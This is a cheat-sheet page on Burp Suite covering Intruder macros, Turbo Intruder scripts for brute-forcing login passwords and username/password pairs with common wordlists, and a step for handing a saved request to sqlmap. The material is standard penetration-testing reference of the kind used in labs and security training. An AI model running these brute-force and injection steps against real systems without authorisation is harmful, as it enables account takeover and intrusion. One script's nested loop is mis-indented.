---
title: Burp Suite
desc: An application security testing software.
tags: [Burp, Web]
alts: []
render_with_liquid: false
---

## 1. Automate a Sequence of Requests with Burp Intruder

```
1. "Project options" -> "Sessions" -> "Session handling rules" panel -> Click "Add"
2. "Session handling rules editor" opens
3. "Scope" tab -> Select "Include all URLs"
4. "Details" tab -> Under "Rule actions" -> Click "Add" -> "Run a macro" -> Under "Select macro" -> Click "Add"
5. "Macro Recorder" opens
6. Select the sequence of requests as follows:
	POST /message/submit
	GET /message
	POST /account
7. Click "OK"

<For management of parameters>
option 1. In the list of requests, select the requests in which specific value used POST parameter changes.
option 2. Click "Configure item" -> Dialog opens -> Click "Add" -> Enter the name of the parameter.
option 3. Highlight the value in the response code.
option 4. Click "OK" twice to go back to the Macro editor.
option 5. Select the POST request in which using the above value for parameter.
option 6. Click "Configure item" -> In the "Parameter handling" section -> drop-down to menus to specify the parameter name to be "derived from the prior response (response 4) -> Click "OK"
option 7. In the Macro editor -> Click "Test macro" to check if the sequence does correctly.

8. Send the arbitrary request to the Burp Intruder.
9. Select "Sniper" attack type.
10. On the "Payloads" tab -> select the payload type "Null payloads" -> Under "Payload options" -> enter the arbitrary number of payloads.
11. Start the attack.
```

<br />

## 2. Brute Force using Turbo Intruder

1. **Single Parameter**

    Set **“%s”** to the parameter for brute force.

    ```python
    POST /login HTTP/1.1
    ...
    username=admin&password=%s

    # -------------------------------------------------------------------

    def queueRequests(target, wordlists):
        engine = RequestEngine(endpoint=target.endpoint,
                            concurrentConnections=5,
                            requestsPerConnection=5,
                            pipeline=False
                            )

        # Brute force (wordlist)
        for word in open('/usr/share/wordlists/rockyou.txt'):
            engine.queue(target.req, word.rstrip())

        # Brute force (0 - 255)
        for i in range(0, 255):
            engine.queue(target.req, str(i))

        # Brute force (0000 - 9999)
        for word in open('/usr/share/seclists/Fuzzing/4-digits-0000-9999.txt'):
            engine.queue(target.req, word.rstrip())

        # Brute Force (alphabet)
        for word in open('/usr/share/seclists/Fuzzing/char.txt'):
            engine.queue(target.req, word.rstrip())

        # Brute Force (alphanum upper-lower)
        for word in open('/usr/share/seclists/Fuzzing/alphanum-case.txt'):
            engine.queue(target.req, word.rstrip())

        # Null payloads (infinite loop)
        i = 0
        while i < 1:
            engine.queue(target.req, None)

        # Null payloads (100 loops)
        i = 0
        while i < 100:
            engine.queue(target.req, None)
            i += 1


    def handleResponse(req, interesting):
        if interesting:
            table.add(req)
    ```

2. **Multiple Parameters**

    Set **multipla “%s”** to the parameters for brute force.

    ```python

    POST /login HTTP/1.1
    ...
    username=%s&password=%s

    # --------------------------------------------------------------

    def queueRequests(target, wordlists):
        engine = RequestEngine(endpoint=target.endpoint,
                            concurrentConnections=5,
                            requestsPerConnection=100,
                            pipeline=False
                            )

        for firstWord in open('/path/to/usernames'):
        for secondWord in open('/path/to/passwords'):
            engine.queue(target.req, [firstWord.rstrip(), secondWord.rstrip()])


    def handleResponse(req, interesting):
        # currently available attributes are req.status, req.wordcount, req.length and req.response
        if req.status != 404:
            table.add(req)
    ```

<br />

## 4. Useful BApps

To install them, move to **“Extender” → “BApp Store”**.

```
Decoder Improved
Turbo Intruder
```

<br />

## 5. Download Request Data for Sqlmap

When using **Sqlmap**, you'll be able to use the downloaded file.

```sh
# On Burp Suite

1. Right click in the request field.
2. Click "Save item" to download the request url, headers, so on.
3. Save as "request.txt" (this is arbitrary).

# ----------------------------------

# On your terminal

sqlmap -r request.txt
```
